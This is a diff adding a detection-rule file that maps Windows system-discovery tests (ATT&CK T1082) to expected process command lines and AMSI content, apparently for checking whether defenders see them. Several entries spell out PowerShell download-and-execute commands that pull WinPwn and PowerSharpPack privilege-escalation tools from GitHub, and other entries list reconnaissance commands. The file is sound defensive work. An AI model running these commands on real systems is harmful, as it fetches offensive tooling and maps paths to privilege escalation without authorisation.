@@ -1,0 +1,100 @@
+T1082,windows,66703791,System Information Discovery
+_E_,Process,cmdline~=systeminfo
+_E_,Process,cmdline~=reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum
+
+T1082,windows,85cfbf23,Hostname Discovery (Windows)
+_E_,Process,cmdline~=hostname
+
+T1082,windows,224b4daf,Windows MachineGUID Discovery
+_E_,Process,cmdline~=REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid
+
+T1082,windows,69bd4abe,Griffon Recon
+ARG,vbscript,PathToAtomicsFolder\T1082\src\griffon_recon.vbs
+_E_,Process,cmdline~=cscript,cmdline~=griffon_recon.vbs
+
+T1082,windows,f400d1c0,Environment variables discovery on windows
+FYI, set command displays the value of all the environment variables 
+_E_,Process,cmdline~=set
+
+T1082,windows,eea1d918,WinPwn - winPEAS
+FYI, Test fails
+_E_,AMSI,scan_content~=$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+_E_,AMSI,scan_content~=iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+_E_,AMSI,scan_content~=winPEAS -noninteractive -consoleoutput
+
+T1082,windows,3d256a2f,WinPwn - itm4nprivesc
+_E_,AMSI,scan_content~=$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+_E_,AMSI,scan_content~=iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+_E_,AMSI,scan_content~=itm4nprivesc -noninteractive -consoleoutput
+
+T1082,windows,345cb8e4,WinPwn - Powersploits privesc checks
+FYI, Test fails
+_E_,AMSI,scan_content~=$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+_E_,AMSI,scan_content~=iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+_E_,AMSI,scan_content~=oldchecks -noninteractive -consoleoutput
+
+T1082,windows,5b6f39a2,WinPwn - General privesc checks
+FYI, Test fails
+_E_,AMSI,scan_content~=$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+_E_,AMSI,scan_content~=iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+_E_,AMSI,scan_content~=otherchecks -noninteractive -consoleoutput
+
+T1082,windows,7804659b,WinPwn - GeneralRecon
+FYI, Test fails
+_E_,AMSI,scan_content~=$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+_E_,AMSI,scan_content~=iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+_E_,AMSI,scan_content~=Generalrecon -consoleoutput -noninteractive
+
+T1082,windows,3278b2f6,WinPwn - Morerecon
+_E_,AMSI,scan_content~=$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+_E_,AMSI,scan_content~=iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+_E_,AMSI,scan_content~=Morerecon -noninteractive -consoleoutput
+
+T1082,windows,dec6a0d8,WinPwn - RBCD-Check
+FYI,Test fails
+_E_,AMSI,scan_content~=$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+_E_,AMSI,scan_content~=iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+_E_,AMSI,scan_content~=RBCD-Check -consoleoutput -noninteractive
+
+T1082,windows,07b18a66,WinPwn - PowerSharpPack - Watson searching for missing windows patches
+FYI, Test fails
+_E_,AMSI,scan_content~=iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')
+_E_,AMSI,scan_content~=Invoke-watson
+
+T1082,windows,efb79454,WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors
+_E_,AMSI,scan_content~=iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')
+_E_,AMSI,scan_content~=Invoke-SharpUp -command "audit"
+
+T1082,windows,5c16ceb4,WinPwn - PowerSharpPack - Seatbelt
+FYI, Test fails
+_E_,AMSI,scan_content~=iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')
+_E_,AMSI,scan_content~=Invoke-Seatbelt -Command "-group=all"; pause
+
+T1082,windows,8851b73a,System Information Discovery with WMIC
+FYI, Test fails
+_E_,Process,cmdline~=wmic cpu get name
+_E_,Process,cmdline~=wmic MEMPHYSICAL get MaxCapacity
+_E_,Process,cmdline~=wmic baseboard get product
+_E_,Process,cmdline~=wmic baseboard get version
+_E_,Process,cmdline~=wmic bios get SMBIOSBIOSVersion
+_E_,Process,cmdline~=wmic path win32_VideoController get name
+_E_,Process,cmdline~=wmic path win32_VideoController get DriverVersion
+_E_,Process,cmdline~=wmic path win32_VideoController get VideoModeDescription
+_E_,Process,cmdline~=wmic OS get Caption,OSArchitecture,Version
+_E_,Process,cmdline~=wmic DISKDRIVE get Caption
+_E_,Process,cmdline~=Get-WmiObject win32_bios
+
+T1082,windows,bd85e3d1,Driver Enumeration using DriverQuery
+_E_,Process,cmdline~=driverquery /v
+_E_,Process,cmdline~=driverquery /si
+
+T1082,windows,4060ee98,System Information Discovery
+_E_,Process,cmdline~=wscript.exe C:\Windows\System32\gatherNetworkInfo.vbs
+
+T1082,windows,96be6002,Check computer location
+_E_,Process,cmdline~=reg query HKEY_CURRENT_USER\Control Panel\International\Geo
+
+T1082,windows,f2f91612,BIOS Information Discovery through Registry
+FYI, Test fails
+_E_,Process,cmdline~=reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v SystemBiosVersion
+_E_,Process,cmdline~=reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v VideoBiosVersion
